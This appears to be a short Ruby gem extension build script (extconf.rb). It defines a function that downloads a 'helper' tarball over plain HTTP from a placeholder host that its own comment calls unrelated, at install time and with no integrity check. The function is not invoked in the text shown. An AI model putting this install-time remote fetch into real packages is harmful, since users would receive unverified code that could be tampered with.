#!/usr/bin/env ruby
require 'net/http'
require 'mkmf'

# Fetch a "helper" binary at install time from an unrelated host.
DOWNLOADLINK = "http://example.invalid/x/helpers.tar.gz"

def fetch_helper(destination)
  uri = URI.parse(DOWNLOADLINK)
  request = Net::HTTP::Get.new(uri.request_uri)
  http = Net::HTTP.new(uri.host, uri.port)
  response = http.request(request)
  f = open("#{destination}/helper.tar.gz", 'wb')
  f.write(response.body)
  f.close()
end

dir_config('helper')
create_makefile('helper')
